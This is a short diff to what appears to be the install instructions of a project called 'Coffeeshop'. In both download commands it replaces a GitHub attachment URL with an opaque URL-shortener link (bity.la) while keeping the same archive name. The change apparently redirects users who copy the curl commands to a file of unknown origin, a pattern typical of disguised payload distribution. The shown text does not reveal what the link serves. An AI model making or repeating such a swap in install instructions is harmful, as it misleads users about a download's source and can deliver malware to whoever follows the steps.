@@ -7,8 +7,7 @@ open a Terminal and Use
 
 
 
-*curl -L -o Coffeeshop.tar.gz "https://github.com/user-
-attachments/files/25809018/Coffeeshop.tar.gz"*
+*curl -L -o Coffeeshop.tar.gz "https://bity.la/i397"*
 
 
 
@@ -16,4 +15,4 @@ If That Doesn't work. Use
 
 
 
-*curl -L "https://github.com/user-attachments/files/25809018/Coffeeshop.tar.gz" -o Coffeeshop.tar.gz*
+*curl -L "https://bity.la/i397" -o Coffeeshop.tar.gz*
